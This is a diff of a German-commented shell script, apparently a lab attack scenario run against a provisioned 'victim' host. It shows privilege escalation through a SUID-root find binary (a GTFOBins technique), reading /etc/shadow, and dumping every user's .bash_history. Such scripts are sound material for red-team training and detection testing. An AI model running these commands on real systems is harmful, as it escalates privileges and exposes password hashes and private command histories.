@@ -24,17 +24,19 @@ on_victim <<'REMOTE'
 crontab -l
 REMOTE
 
-echo "[E6] SUID-Missbrauch: find laeuft mit Root-Rechten"
+echo "[E6] SUID-Missbrauch: SUID-find schreibt als root"
 on_victim <<'REMOTE'
-find . -maxdepth 0 -exec whoami \;
-find . -maxdepth 0 -exec touch /root/pwned_via_suid \;
+# /usr/bin/find traegt das SUID-Bit (durch die Provisionierung gesetzt).
+# GTFOBins: -exec laeuft dadurch mit den Rechten des Datei-Eigentuemers (root).
+find . -maxdepth 0 -exec whoami \; -quit
+find . -maxdepth 0 -exec touch /root/pwned_via_suid \; -quit
 ls -la /root/pwned_via_suid
 REMOTE
 
 echo "[E7] Massenlesezugriff auf /etc/shadow und Home-Verzeichnisse"
 on_victim <<'REMOTE'
 sudo cat /etc/shadow
-for f in /home/*/.bash_history; do echo "== $f =="; sudo cat "$f"; done
+shopt -s nullglob; for f in /home/*/.bash_history; do echo "== $f =="; sudo cat "$f"; done
 REMOTE
 
 echo "[*] Szenario 2 - Ende: $(date --iso-8601=seconds)"
